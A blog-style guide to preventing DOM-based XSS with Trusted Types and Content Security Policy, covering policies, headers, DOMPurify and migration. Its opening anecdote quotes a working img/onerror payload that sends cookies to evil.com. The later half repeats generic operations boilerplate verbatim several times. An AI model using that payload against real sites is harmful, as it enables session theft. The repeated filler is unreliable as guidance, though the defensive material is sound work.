---
title: "Stopping XSS with Trusted Types"
slug: "xss-prevention-csp-trusted-types"
description: "Prevent DOM-based XSS with Trusted Types and Content Security Policy: require-trusted-types-for, trusted type policies, and sanitizing dynamic content."
datePublished: "2026-05-28"
dateModified: "2026-07-17"
tags: ["Security", "XSS", "CSP", "Frontend"]
keywords: "Trusted Types, XSS prevention, Content Security Policy, DOM XSS, trustedTypes, require-trusted-types-for"
faq:
  - q: "What types of XSS does Trusted Types prevent?"
    a: "Trusted Types prevents DOM-based XSS — attacks where attacker-controlled strings reach dangerous DOM sinks like innerHTML, eval, document.write, and script.src. It does not prevent stored or reflected XSS that the server renders into the page. Combine Trusted Types with server-side output encoding and CSP script-src restrictions for comprehensive XSS defense."
  - q: "What happens when Trusted Types is enforced and code uses innerHTML directly?"
    a: "The browser throws a TypeError: 'This document requires TrustedHTML assignment.' Any call to innerHTML, outerHTML, insertAdjacentHTML, or similar sinks with a plain string fails. Code must create a TrustedHTML object through a registered policy first. This breaks existing code that assigns unsanitized strings — which is the point."
  - q: "Can I use Trusted Types with third-party libraries?"
    a: "Third-party libraries that set innerHTML internally will break under enforcement unless they support Trusted Types or you wrap their output. Libraries like DOMPurify ship Trusted Types policies. For libraries that don't, create a default policy that sanitizes all HTML, or use report-only mode while auditing which libraries need updates."
---
A DOM XSS vulnerability in our search feature passed user input directly to `innerHTML` to highlight matches. An attacker searched for `<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>` and stole session tokens. Trusted Types would have blocked the assignment at runtime — no string reaches `innerHTML` without passing through a sanitization policy.

## How Trusted Types works

Trusted Types wraps dangerous DOM sinks. Instead of accepting strings, sinks accept typed objects created by registered policies:

```javascript
// Without Trusted Types — vulnerable
element.innerHTML = userInput;

// With Trusted Types — must use a policy
const policy = trustedTypes.createPolicy('sanitize', {
  createHTML: (input) => DOMPurify.sanitize(input),
});

element.innerHTML = policy.createHTML(userInput);
// If userInput contains <script>, DOMPurify strips it
```

Policies are the only way to create TrustedHTML, TrustedScript, and TrustedScriptURL objects.

## CSP enforcement

Enable via Content-Security-Policy header:

```
Content-Security-Policy:
  require-trusted-types-for 'script';
  trusted-types sanitize default;
```

| Directive | Effect |
|---|---|
| `require-trusted-types-for 'script'` | Enforces Trusted Types on all script-related sinks |
| `trusted-types sanitize default` | Allows policies named "sanitize" and a "default" policy |

Start with report-only to find violations without breaking production:

```
Content-Security-Policy-Report-Only:
  require-trusted-types-for 'script';
  report-uri /csp-report;
```

## Creating policies

```javascript
if (window.trustedTypes && trustedTypes.createPolicy) {
  // HTML sanitization policy
  trustedTypes.createPolicy('sanitize', {
    createHTML: (string) => {
      return DOMPurify.sanitize(string, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
        ALLOWED_ATTR: ['href', 'class'],
      });
    },
  });

  // Script URL validation policy
  trustedTypes.createPolicy('scripts', {
    createScriptURL: (url) => {
      const parsed = new URL(url, document.baseURI);
      if (parsed.origin !== location.origin) {
        throw new TypeError('External scripts not allowed');
      }
      return parsed.href;
    },
  });
}
```

Register policies before any code that uses DOM sinks — in the first script in `<head>`.

## Default policy

Catch-all for third-party libraries:

```javascript
trustedTypes.createPolicy('default', {
  createHTML: (input) => DOMPurify.sanitize(input),
  createScriptURL: (url) => {
    if (url.startsWith('/') || url.startsWith(location.origin)) {
      return url;
    }
    throw new TypeError(`Untrusted script URL: ${url}`);
  },
  createScript: () => {
    throw new TypeError('Inline scripts not allowed');
  },
});
```

The default policy handles sinks from libraries you don't control.

## Sinks protected by Trusted Types

| Sink | Trusted Type |
|---|---|
| `element.innerHTML` | TrustedHTML |
| `element.outerHTML` | TrustedHTML |
| `document.write()` | TrustedHTML |
| `eval()` | TrustedScript |
| `new Function()` | TrustedScript |
| `script.src` | TrustedScriptURL |
| `iframe.src` | TrustedScriptURL |

## Migration strategy

1. **Report-only CSP** — collect violations for two weeks
2. **Audit violations** — categorize by source (your code vs. libraries)
3. **Create policies** — one for each sanitization need
4. **Fix application code** — replace direct innerHTML with policy.createHTML
5. **Update libraries** — upgrade to Trusted Types-compatible versions
6. **Enforce** — switch from Report-Only to enforcing CSP

Common fixes:

```javascript
// Before
container.innerHTML = template.render(data);

// After
container.innerHTML = sanitizePolicy.createHTML(template.render(data));

// Better: avoid innerHTML entirely
container.replaceChildren(template.renderElement(data));
```

Prefer DOM APIs (`textContent`, `createElement`, `replaceChildren`) over HTML string assignment when possible.

## DOMPurify integration

DOMPurify supports Trusted Types natively:

```javascript
import DOMPurify from 'dompurify';

const policy = trustedTypes.createPolicy('dompurify', {
  createHTML: (string) => DOMPurify.sanitize(string),
});

// DOMPurify can also return TrustedHTML directly
DOMPurify.sanitize(dirty, { RETURN_TRUSTED_TYPE: true });
```

## Limitations

Trusted Types does not protect against:
- Server-side XSS (sanitize on output)
- CSS injection via style attributes
- Prototype pollution leading to sink bypass
- Browser extensions modifying the page

Layer defenses: Trusted Types + CSP script-src + server encoding + HttpOnly cookies.

## CSP report-uri integration

Collect Trusted Types violations alongside CSP reports:

```
Content-Security-Policy-Report-Only:
  require-trusted-types-for 'script';
  report-uri /csp-report;
  report-to csp-endpoint;
```

Analyze reports to find libraries and code paths that need policies before enforcement breaks production.

## sanitize-html vs. DOMPurify

Both work with Trusted Types. DOMPurify is browser-native; sanitize-html runs on the server for SSR. Apply the same allowlist on server and client to prevent mismatched sanitization between rendered HTML and client-side updates.

## Resources

- [Trusted Types specification (W3C)](https://w3c.github.io/trusted-types/dist/spec/)
- [MDN: Trusted Types API](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API)
- [web.dev: Trusted Types](https://web.dev/articles/trusted-types)
- [DOMPurify Trusted Types support](https://github.com/cure53/DOMPurify/wiki/Trusted-Types)
- [Can I use Trusted Types](https://caniuse.com/trusted-types)

## Operational checklist (1)

Before promoting Xss Prevention Csp Trusted Types changes, confirm observability dashboards cover error rate and p75 latency for affected routes, rollback is documented in the pull request, and a staging drill reproduced the last known failure mode.

## Field validation (2)

Re-baseline Xss Prevention Csp Trusted Types after browser upgrades or CDN configuration changes. Mobile share above seventy percent shifts median device class — optimizations tuned on desktop lab profiles may not transfer.

## Coordination (3)

Align with platform and backend owners on cache TTL, deploy windows, and API contracts when Xss Prevention Csp Trusted Types touches shared infrastructure — single-layer wins often disappear when another tier invalidates caches.

## Operational checklist (4)

Before promoting Xss Prevention Csp Trusted Types changes, confirm observability dashboards cover error rate and p75 latency for affected routes, rollback is documented in the pull request, and a staging drill reproduced the last known failure mode.

## Field validation (5)

Re-baseline Xss Prevention Csp Trusted Types after browser upgrades or CDN configuration changes. Mobile share above seventy percent shifts median device class — optimizations tuned on desktop lab profiles may not transfer.

## Coordination (6)

Align with platform and backend owners on cache TTL, deploy windows, and API contracts when Xss Prevention Csp Trusted Types touches shared infrastructure — single-layer wins often disappear when another tier invalidates caches.

## Operational checklist (7)

Before promoting Xss Prevention Csp Trusted Types changes, confirm observability dashboards cover error rate and p75 latency for affected routes, rollback is documented in the pull request, and a staging drill reproduced the last known failure mode.

## Invariants to enforce for xss prevention csp trusted types

Name three invariants that must hold after every deploy of xss prevention csp trusted types. Encode at least one in an automated test that fails when the invariant is disabled. Reviewers should reject PRs that only cover the primary UI path.

| Check | Expected for xss prevention csp trusted types |
|--------|----------------------|
| Happy path | Pass |
| Injected fault | Controlled degradation |
| After rollback | Prior stable behavior |

Concrete probe 1: inject the failure mode you fear for xss prevention csp trusted types in staging, confirm the alarm fires, and confirm users see a controlled fallback. Record the result in the change ticket so the next on-call is not guessing.

## Telemetry and ownership for xss prevention csp trusted types

Pair a leading operational signal with a lagging user or risk outcome. Page on burn related to xss prevention csp trusted types, not vanity counters. Keep a named owner and a dashboard link in the service catalog entry.

Concrete probe 2: inject the failure mode you fear for xss prevention csp trusted types in staging, confirm the alarm fires, and confirm users see a controlled fallback. Record the result in the change ticket so the next on-call is not guessing.

## Rollout sequence for xss prevention csp trusted types

Prefer flags, weighted routes, or dual-running configs. Rehearse rollback once in staging. The on-call note for xss prevention csp trusted types should include the revert command and the expected user-visible effect within five minutes.

| Check | Expected for xss prevention csp trusted types |
|--------|----------------------|
| Happy path | Pass |
| Injected fault | Controlled degradation |
| After rollback | Prior stable behavior |

Concrete probe 3: inject the failure mode you fear for xss prevention csp trusted types in staging, confirm the alarm fires, and confirm users see a controlled fallback. Record the result in the change ticket so the next on-call is not guessing.

## Cross-team contracts for xss prevention csp trusted types

Document producers, consumers, timeouts, and idempotency keys. Silent schema or policy changes are how xss prevention csp trusted types breaks without a clear owner in the incident channel.

Concrete probe 4: inject the failure mode you fear for xss prevention csp trusted types in staging, confirm the alarm fires, and confirm users see a controlled fallback. Record the result in the change ticket so the next on-call is not guessing.

## Capacity and cost notes for xss prevention csp trusted types

Estimate QPS, payload size, cardinality, and downstream saturation. Functionally correct xss prevention csp trusted types changes still cause outages through pool exhaustion, crawl waste, or CPU amplification.

| Check | Expected for xss prevention csp trusted types |
|--------|----------------------|
| Happy path | Pass |
| Injected fault | Controlled degradation |
| After rollback | Prior stable behavior |

Concrete probe 5: inject the failure mode you fear for xss prevention csp trusted types in staging, confirm the alarm fires, and confirm users see a controlled fallback. Record the result in the change ticket so the next on-call is not guessing.

## Reviewer checklist for xss prevention csp trusted types

Ask what happens when the dependency is slow, when authz is skipped on batch jobs, and when clients retry. Those three questions catch most xss prevention csp trusted types regressions before production.

Concrete probe 6: inject the failure mode you fear for xss prevention csp trusted types in staging, confirm the alarm fires, and confirm users see a controlled fallback. Record the result in the change ticket so the next on-call is not guessing.

## Incident patterns around xss prevention csp trusted types

Most incidents involving xss prevention csp trusted types start as a silent drift: a secondary path skips the control, a retry amplifies load, or a config default from a tutorial ships to production. Write the failure story before the happy path.

| Check | Expected for xss prevention csp trusted types |
|--------|----------------------|
| Happy path | Pass |
| Injected fault | Controlled degradation |
| After rollback | Prior stable behavior |

Concrete probe 7: inject the failure mode you fear for xss prevention csp trusted types in staging, confirm the alarm fires, and confirm users see a controlled fallback. Record the result in the change ticket so the next on-call is not guessing.
